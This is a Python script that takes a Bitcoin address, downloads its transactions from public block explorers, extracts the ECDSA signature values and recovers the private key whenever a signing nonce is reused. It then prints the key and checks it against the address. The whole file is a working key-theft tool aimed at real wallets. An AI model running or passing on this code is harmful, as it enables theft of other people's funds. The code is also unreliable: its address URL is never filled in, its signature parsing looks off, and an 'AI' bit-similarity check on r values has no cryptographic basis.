# -*- coding: utf-8 -*-
"""

"""

import sys, json, hashlib, argparse
from urllib.request import urlopen
from itertools import combinations
import secp256k1 as ice

N = ice.N
ZERO = ice.Zero

def sha256(b): return hashlib.sha256(b).digest()
def hash160(pub): h=hashlib.new('ripemd160'); h.update(hashlib.sha256(pub).digest()); return h.digest()
def inv(a): return pow(a, N-2, N)

def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
    s = sig[8+rlen*2:]
    return r, s

def split_sig(script):
    sigLen = int(script[2:4], 16)
    sig = script[4:4+sigLen*2]
    r, s = get_rs(sig)
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    return r, s, pub

def parse_tx(txn):
    if len(txn) < 130: sys.exit('[!] Transaction too short')
    if txn[8:12] == '0001': sys.exit('[!] Witness Tx not supported')
    cur = 10
    num_inputs = int(txn[8:10], 16)
    inputs = []
    for _ in range(num_inputs):
        prev = txn[cur:cur+64]
        var0 = txn[cur+64:cur+72]
        cur += 72
        slen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*slen]
        cur += 2 + 2*slen
        r, s, pub = split_sig(script)
        seq = txn[cur:cur+8]
        cur += 8
        inputs.append([prev, var0, r, s, pub, seq])
    rest = txn[cur:]
    return [txn[0:10], inputs, rest]

def get_signable(parsed):
    first, ins, rest = parsed
    res = []
    for idx, i in enumerate(ins):
        tx = first
        for j, jn in enumerate(ins):
            tx += jn[0] + jn[1]
            if j == idx:
                tx += '1976a914' + hash160(bytes.fromhex(i[4])).hex() + '88ac'
            else:
                tx += '00'
            tx += jn[5]
        tx += rest + "01000000"
        z = sha256(sha256(bytes.fromhex(tx))).hex()
        res.append([i[2], i[3], z, i[4]])
    return res

def fetch_txid(address):
    txid, idx = [], []
    url = "https://mempool.space/api/address/%s/txs"
    res = json.loads(urlopen(url).read())
    for tx in res:
        for j, vin in enumerate(tx["vin"]):
            if vin["prevout"]["scriptpubkey_address"] == address:
                txid.append(tx["txid"])
                idx.append(j)
    return txid, idx

def calc_RQ(r, s, z, pub):
    R1 = ice.pub2upub('02'+hex(r)[2:].zfill(64))
    R2 = ice.pub2upub('03'+hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    f1 = ice.point_subtraction(ice.point_multiplication(R1, sdr), ice.scalar_multiplication(zdr))
    f2 = ice.point_subtraction(ice.point_multiplication(R2, sdr), ice.scalar_multiplication(zdr))
    P = ice.pub2upub(pub)
    if f1 == P: return R1
    if f2 == P: return R2
    return 'fail'

def getpvk(r1, s1, z1, r2, s2, z2, m):
    num = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    den = inv((s1 * r2 - s2 * r1) % N)
    return (num * den) % N

def is_r_similar(r1, r2, threshold=0.93):
    b1 = bin(int(r1, 16))[2:].zfill(256)
    b2 = bin(int(r2, 16))[2:].zfill(256)
    diff = sum(c1 != c2 for c1, c2 in zip(b1, b2))
    return (1 - diff / 256) >= threshold

def find_similar_rs(r_list):
    pairs = []
    for i in range(len(r_list)):
        for j in range(i+1, len(r_list)):
            if is_r_similar(r_list[i], r_list[j]):
                pairs.append((i, j, r_list[i], r_list[j]))
    return pairs

# ---------------- MAIN ----------------
parser = argparse.ArgumentParser()
parser.add_argument("-a", required=True, help="Bitcoin address")
args = parser.parse_args()
address = args.a

print(f"[+] Address: {address}")
txids, indexes = fetch_txid(address)
rL, sL, zL, QL = [], [], [], []

for txid, idx in zip(txids, indexes):
    raw = urlopen(f"https://blockchain.info/rawtx/{txid}?format=hex").read().decode()
    parsed = parse_tx(raw)
    signs = get_signable(parsed)
    r = int(signs[idx][0], 16)
    s = int(signs[idx][1], 16)
    z = int(signs[idx][2], 16)
    pub = signs[idx][3]
    rL.append(r)
    sL.append(s)
    zL.append(z)
    QL.append(pub)
    print(f" - txid: {txid}  r: {hex(r)}")

# تحليل ذكاء: تشابه r
r_hex = [hex(r)[2:].zfill(64) for r in rL]
similar_rs = find_similar_rs(r_hex)
if similar_rs:
    print(f"\n[AI] ⚠️ Detected similar r values:")
    for i, j, r1, r2 in similar_rs:
        print(f"   [Index {i} vs {j}] r1 ≈ r2")
else:
    print("[✓] No similar r values found.")

# استرجاع مفتاح خاص في حالة تكرار R
RQ = [calc_RQ(rL[i], sL[i], zL[i], QL[i]) for i in range(len(rL))]
for i, j in combinations(range(len(RQ)), 2):
    if RQ[i] != 'fail' and RQ[i] == RQ[j]:
        print(f"\n[!!] Duplicate R Detected: input {i} and {j}")
        d = getpvk(rL[i], sL[i], zL[i], rL[j], sL[j], zL[j], 0)
        print(f"[✓] Private Key Recovered: {hex(d)}")
        for key in ice.one_to_6privatekey(d):
            check = ice.privatekey_to_address(0, True, key)
            if check == address:
                print(f"[✓] Valid Key: {hex(key)} => {check}")
                break
        break
else:
    print("[×] No duplicate R found.")
